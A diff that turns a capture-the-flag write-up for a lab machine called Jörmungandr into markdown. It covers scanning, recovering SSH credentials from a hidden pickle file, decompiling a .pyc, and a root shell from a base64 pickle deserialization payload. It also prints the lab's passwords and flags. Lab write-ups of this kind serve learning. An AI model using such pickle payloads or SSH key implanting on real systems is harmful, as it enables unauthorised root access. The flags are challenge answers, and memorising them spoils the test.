@@ -1,5 +1,7 @@
-Jörmungandr
+# Jörmungandr
 
+## Enumeration
+```bash
 └─$ sudo nmap -sS -A 10.10.249.240                            
 [sudo] password for marius: 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 12:15 BST
@@ -38,19 +40,33 @@ TRACEROUTE (using port 20/tcp)
 HOP RTT      ADDRESS
 1   35.66 ms 10.8.0.1
 2   36.08 ms 10.10.249.240
-
-
-
+```
+### I go to the ftp and I found the .hidden file
+```bash
 get .hidden
+```
+## Exploitation
 
-In this file, i got python pickle encoded in binary
+### In this file, I got python pickle encoded in binary
 
-after decoding with script i got this : 
+### After decoding with script i got this : 
+```bash
 └─$ python3 script.py
 Username: fenrir
 Password: I_will_kill_odin_during_ragnarok
+```
+### I go on the fenrir ssh and I found the mjollnir.pyc file
 
+## User FLAG
+
+I forgot to write it :(
+
+## Privilege Escalation
+
+```bash
 └─$ uncompyle6 mjollnir.pyc 
+```
+```python
 # uncompyle6 version 3.9.1
 # Python bytecode version base 3.8.0 (3413)
 # Decompiled from: Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0]
@@ -118,26 +134,31 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-# okay decompiling mjollnir.pyc
-
+```
+```bash
 └─$ python decode.py         
 b'jormungandr'
 b'Jag_ar_Jormungandr_midgardsormen'
+```
+### I go on the jormungandr ssh session
 
-i follow this tuto https://medium.com/@cuncis/implanting-ssh-keys-a-step-by-step-guide-with-command-examples-f57b21690854
+### I follow this tuto https://medium.com/@cuncis/implanting-ssh-keys-a-step-by-step-guide-with-command-examples-f57b21690854
 
+```bash
 sudo /opt/ragnarok/ragnarok
+```
 
-try 1 : bash
-Error: If this is your last meal, include at least a pickle in it!
-try 2 : pickle
-Error: the meal is 64 times worst than I thought
-(find a write up for this) try 3 :
-gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARiYXNolIWUUpQu
+#### try 1 : bash
+```Error: If this is your last meal, include at least a pickle in it!```
+#### try 2 : pickle
+```Error: the meal is 64 times worst than I thought```
+#### (find a write up for this) try 3 :
+```gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARiYXNolIWUUpQu```
 
+```bash
 cd /root
-
-cat `ls`: EPI{deN_hAr_GudarNa2_ErA_GaR_m0T_sITT_sluT}
+```
+## Root FLAG
+```cat `ls` ```: EPI{deN_hAr_GudarNa2_ErA_GaR_m0T_sITT_sluT}
 
 
